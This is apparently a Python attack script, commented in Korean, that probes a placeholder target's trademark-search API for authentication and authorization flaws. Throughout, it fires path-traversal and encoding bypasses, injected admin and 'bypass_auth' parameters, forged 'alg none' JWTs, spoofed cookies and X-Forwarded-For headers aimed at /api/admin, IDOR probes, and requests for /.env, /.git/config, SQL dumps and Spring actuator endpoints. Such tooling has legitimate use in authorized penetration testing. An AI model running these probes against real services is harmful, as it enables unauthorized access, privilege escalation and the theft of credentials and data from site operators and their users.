"""
대상 서비스 API 인증/인가 심층 테스트
- IDOR (Insecure Direct Object Reference)
- 권한 상승 시도
- JWT/세션 조작
- API 버전 우회
- 숨겨진 파라미터 탐색
"""

import requests
import json
import base64
import time

BASE_URL = "https://www.example-target.com"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Referer": "https://www.example-target.com/service"
}


def test_endpoint(method, url, payload=None, headers=HEADERS, test_name=""):
    """엔드포인트 테스트"""
    print(f"\n{'='*70}")
    print(f"테스트: {test_name}")
    print(f"{'='*70}")
    
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            response = requests.post(url, headers=headers, json=payload, timeout=10)
        else:
            response = requests.request(method, url, headers=headers, json=payload, timeout=10)
        
        print(f"상태 코드: {response.status_code}")
        
        try:
            data = response.json()
            response_str = json.dumps(data, ensure_ascii=False, indent=2)
            if len(response_str) > 800:
                print(f"응답:\n{response_str[:800]}...")
            else:
                print(f"응답:\n{response_str}")
        except:
            print(f"응답: {response.text[:500]}")
        
        return response
        
    except Exception as e:
        print(f"에러: {str(e)}")
        return None


def run_deep_auth_tests():
    """심층 인증/인가 테스트"""
    
    # ============================================
    # 1. API 버전/경로 우회 테스트
    # ============================================
    print("\n" + "#"*70)
    print("# 1. API 버전/경로 우회 테스트")
    print("#"*70)
    
    payload = {
        "query_string": "AD : ( 20250101 ~ 20250201 )",
        "search_type": "general",
        "page": 1,
        "size": 10
    }
    
    path_variations = [
        # 버전 변형
        "/api_renewal/v1/ko/expert_search",
        "/api_renewal/v2/ko/expert_search",
        "/api/v1/ko/expert_search",
        "/api/v2/ko/expert_search",
        
        # 경로 우회
        "/api_renewal/ko/../ko/expert_search",
        "/api_renewal/ko/./expert_search",
        "/api_renewal//ko//expert_search",
        "/api_renewal/ko/expert_search/",
        "/api_renewal/ko/expert_search//",
        
        # 대소문자 변형
        "/API_RENEWAL/KO/EXPERT_SEARCH",
        "/Api_Renewal/Ko/Expert_Search",
        
        # 인코딩 우회
        "/api_renewal/ko/expert%5fsearch",
        "/api_renewal/ko/expert_search%00",
        "/api_renewal/ko/expert_search%20",
        
        # 확장자 추가
        "/api_renewal/ko/expert_search.json",
        "/api_renewal/ko/expert_search.xml",
        "/api_renewal/ko/expert_search.html",
    ]
    
    for path in path_variations:
        test_endpoint("POST", f"{BASE_URL}{path}", payload, HEADERS, f"경로: {path}")
    
    # ============================================
    # 2. 숨겨진 파라미터 탐색
    # ============================================
    print("\n" + "#"*70)
    print("# 2. 숨겨진 파라미터 탐색")
    print("#"*70)
    
    hidden_params = [
        # 관리자/디버그 파라미터
        {"debug": True},
        {"debug": "true"},
        {"admin": True},
        {"is_admin": True},
        {"role": "admin"},
        {"user_role": "admin"},
        {"privilege": "admin"},
        {"internal": True},
        {"bypass_auth": True},
        {"skip_auth": True},
        {"test_mode": True},
        {"dev_mode": True},
        
        # 권한 상승 시도
        {"user_id": 1},
        {"user_id": "admin"},
        {"account_id": 1},
        {"org_id": 1},
        {"tenant_id": 1},
        
        # 제한 우회
        {"unlimited": True},
        {"no_limit": True},
        {"bypass_rate_limit": True},
        {"premium": True},
        {"subscription": "enterprise"},
        
        # 데이터 접근 확장
        {"include_private": True},
        {"show_all": True},
        {"include_deleted": True},
        {"all_countries": True},
    ]
    
    base_payload = {
        "query_string": "AD : ( 20250101 ~ 20250201 )",
        "search_type": "general",
        "page": 1,
        "size": 10
    }
    
    for param in hidden_params:
        test_payload = {**base_payload, **param}
        param_name = list(param.keys())[0]
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search", 
                     test_payload, HEADERS, f"파라미터: {param_name}={param[param_name]}")
    
    # ============================================
    # 3. JWT 조작 테스트
    # ============================================
    print("\n" + "#"*70)
    print("# 3. JWT/토큰 조작 테스트")
    print("#"*70)
    
    # 가짜 JWT 생성
    fake_jwts = [
        # 알고리즘 none 공격
        base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=') + "." + 
        base64.b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip('=') + ".",
        
        # 일반 가짜 토큰
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.fake",
        
        # 빈 시그니처
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.",
    ]
    
    for jwt in fake_jwts:
        headers = {**HEADERS, "Authorization": f"Bearer {jwt}"}
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     base_payload, headers, f"JWT: {jwt[:50]}...")
        
        # 인증 필요한 API에도 시도
        test_endpoint("GET", f"{BASE_URL}/api/admin", None, headers, 
                     f"관리자 API + JWT: {jwt[:30]}...")
    
    # ============================================
    # 4. 쿠키 조작 테스트
    # ============================================
    print("\n" + "#"*70)
    print("# 4. 쿠키 조작 테스트")
    print("#"*70)
    
    cookie_payloads = [
        "session=admin",
        "user=admin; role=admin",
        "auth=true; is_admin=true",
        "token=admin_token",
        "JSESSIONID=admin",
        "PHPSESSID=admin",
        "auth_token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        "user_id=1",
        "account_type=premium",
        "subscription=enterprise",
    ]
    
    for cookie in cookie_payloads:
        headers = {**HEADERS, "Cookie": cookie}
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     base_payload, headers, f"쿠키: {cookie}")
    
    # ============================================
    # 5. HTTP 헤더 인젝션
    # ============================================
    print("\n" + "#"*70)
    print("# 5. HTTP 헤더 조작")
    print("#"*70)
    
    header_injections = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "localhost"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/api/admin"},
        {"X-Rewrite-URL": "/api/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "localhost"},
        {"X-Forwarded-Host": "localhost"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Cluster-Client-IP": "127.0.0.1"},
        {"X-Admin": "true"},
        {"X-Debug": "true"},
        {"X-Internal": "true"},
    ]
    
    for header in header_injections:
        headers = {**HEADERS, **header}
        header_name = list(header.keys())[0]
        
        # 검색 API
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     base_payload, headers, f"헤더 인젝션: {header_name}")
        
        # 관리자 API (localhost 우회 시도)
        if "127.0.0.1" in str(header) or "localhost" in str(header):
            test_endpoint("GET", f"{BASE_URL}/api/admin", None, headers,
                         f"관리자 API + {header_name}")
    
    # ============================================
    # 6. IDOR 테스트 (ID 기반 접근)
    # ============================================
    print("\n" + "#"*70)
    print("# 6. IDOR 테스트")
    print("#"*70)
    
    # 출원번호 기반 접근 시도
    idor_endpoints = [
        "/api_renewal/ko/trademark/4020250014622",
        "/api_renewal/ko/trademark/detail/4020250014622",
        "/api_renewal/ko/application/4020250014622",
        "/api/trademark/4020250014622",
        "/api/application/4020250014622",
        "/api/user/1",
        "/api/user/profile/1",
        "/api/bookmark/1",
        "/api/history/1",
    ]
    
    for endpoint in idor_endpoints:
        test_endpoint("GET", f"{BASE_URL}{endpoint}", None, HEADERS, f"IDOR: {endpoint}")
    
    # ============================================
    # 7. 파라미터 오염 (HPP)
    # ============================================
    print("\n" + "#"*70)
    print("# 7. HTTP Parameter Pollution")
    print("#"*70)

    hpp_payloads = [
        # 배열 형태로 중복 값 전달
        {"page": [1, 100]},
        {"size": [10, 10000]},
        {"query_string": ["test1", "test2"]},

        # 중첩 배열
        {"page": [[1, 2], [3, 4]]},
    ]

    for payload in hpp_payloads:
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     payload, HEADERS, f"HPP: {str(payload)[:50]}")
    
    # ============================================
    # 8. 백엔드 API 직접 접근 시도
    # ============================================
    print("\n" + "#"*70)
    print("# 8. 내부 서비스 탐색")
    print("#"*70)
    
    internal_endpoints = [
        # Elasticsearch
        "/_search",
        "/_cat/indices",
        "/_cluster/health",
        "/elasticsearch/_search",
        "/es/_search",
        
        # Redis
        "/redis/info",
        
        # 내부 API
        "/internal/api",
        "/private/api",
        "/backend/api",
        "/service/api",
        
        # 헬스체크
        "/health",
        "/healthz",
        "/healthcheck",
        "/api/health",
        "/api/healthz",
        "/status",
        "/api/status",
        "/ping",
        "/api/ping",
        
        # 메트릭
        "/metrics",
        "/api/metrics",
        "/prometheus",
        
        # 환경 정보
        "/env",
        "/api/env",
        "/info",
        "/api/info",
        "/version",
        "/api/version",
        
        # actuator (Spring)
        "/actuator",
        "/actuator/env",
        "/actuator/health",
        "/actuator/info",
        "/actuator/mappings",
    ]
    
    for endpoint in internal_endpoints:
        test_endpoint("GET", f"{BASE_URL}{endpoint}", None, HEADERS, f"내부 서비스: {endpoint}")
    
    # ============================================
    # 9. 파일 접근 시도
    # ============================================
    print("\n" + "#"*70)
    print("# 9. 민감 파일 접근 시도")
    print("#"*70)
    
    file_endpoints = [
        "/.env",
        "/.git/config",
        "/.git/HEAD",
        "/config.json",
        "/config.yaml",
        "/settings.json",
        "/package.json",
        "/composer.json",
        "/web.config",
        "/robots.txt",
        "/sitemap.xml",
        "/.htaccess",
        "/server-status",
        "/nginx.conf",
        "/.well-known/security.txt",
        "/security.txt",
        "/crossdomain.xml",
        "/clientaccesspolicy.xml",
        "/.DS_Store",
        "/backup.sql",
        "/database.sql",
        "/dump.sql",
    ]
    
    for endpoint in file_endpoints:
        response = test_endpoint("GET", f"{BASE_URL}{endpoint}", None, HEADERS, f"파일: {endpoint}")
        if response and response.status_code == 200:
            print(f"⚠️  파일 접근 가능: {endpoint}")


if __name__ == "__main__":
    print("="*70)
    print("대상 서비스 API 인증/인가 심층 테스트")
    print("="*70)
    
    run_deep_auth_tests()
    
    print("\n" + "="*70)
    print("테스트 완료!")
    print("="*70)